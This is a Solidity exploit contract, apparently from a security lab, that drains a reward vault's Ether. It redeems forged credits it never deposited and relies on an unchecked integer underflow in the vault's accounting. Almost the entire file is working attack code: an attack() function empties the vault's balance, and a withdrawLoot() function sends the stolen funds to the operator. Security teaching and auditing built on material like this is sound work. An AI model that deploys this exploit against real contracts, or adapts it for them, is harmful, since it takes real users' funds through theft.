// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface IUncheckedRewardVault {
    function redeem(uint256 creditAmount) external;
    function vaultBalance() external view returns (uint256);
}

/// @title UnderflowRewardVaultAttacker
/// @author Solidity Security Lab
/// @notice Exploit contract that drains UncheckedRewardVault by abusing unchecked underflow.
contract UnderflowRewardVaultAttacker {
    /// @notice Credit conversion rate used by the target vault.
    uint256 public constant CREDIT_PER_WEI = 1e18;

    /// @notice Vulnerable vault targeted by the exploit.
    IUncheckedRewardVault public immutable target;

    /// @notice Attacker operator that controls this contract.
    address public immutable operator;

    /// @notice Emitted when the draining operation starts.
    event AttackExecuted(uint256 drainedWeiAmount, uint256 forgedCreditAmount);

    /// @notice Emitted when stolen Ether is transferred to the attacker operator.
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor(address targetAddress) {
        target = IUncheckedRewardVault(targetAddress);
        operator = msg.sender;
    }

    /// @notice Drains the full Ether balance from the target vault without any prior deposit.
    function attack() external {
        require(msg.sender == operator, "Only operator can attack");

        uint256 drainAmount = target.vaultBalance();
        require(drainAmount > 0, "Vault is empty");

        uint256 forgedCreditAmount = drainAmount * CREDIT_PER_WEI;

        // The attacker does not own these credits.
        // The vulnerable contract will underflow its accounting and still send Ether.
        target.redeem(forgedCreditAmount);

        emit AttackExecuted(drainAmount, forgedCreditAmount);
    }

    /// @notice Transfers stolen Ether to the attacker operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
